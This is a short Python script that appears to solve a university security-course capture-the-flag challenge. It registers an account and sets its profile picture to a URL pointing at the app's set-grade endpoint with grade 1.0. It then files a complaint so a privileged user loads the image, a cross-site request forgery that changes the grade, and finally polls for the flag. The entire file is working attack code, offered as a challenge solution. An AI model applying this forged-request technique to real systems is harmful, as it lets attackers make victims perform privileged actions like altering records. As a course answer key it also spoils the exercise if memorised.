import re
import requests
import time

URL = "https://t10-a8c0e41fc3c53a5a.itsec.sec.in.tum.de/"

# Returns only the flag if there is one in the passed string, otherwise returns None
def extract_flag_from_string(string):
    match = re.search(r'flag\{[^}]+}', string)
    if match:
        return match.group(0)

    return None

with requests.Session() as sess:
    # Reset challenge
    requests.post(f"{URL}/reset")

    # TODO implement exploit
    register_data = {
        "username": "atzehoehl",
        "password": "hoehlistdergeilste1234567"
    }
    sess.post(f"{URL}/register", data=register_data)
    sess.post(f"{URL}/login", data=register_data)
    user_id = sess.get(URL).url.split("/")[4]
    malpic = f"https://t10-a8c0e41fc3c53a5a.itsec.sec.in.tum.de/set-grade?user={user_id}&grade=1.0"
    sess.post(f"{URL}/edit", data={"picture": malpic})
    sess.post(f"{URL}/complain")

    for _ in range(10):
        time.sleep(1)
        r = sess.get(URL)
        flag = extract_flag_from_string(r.text)
        if(flag):
            print(flag)
            break
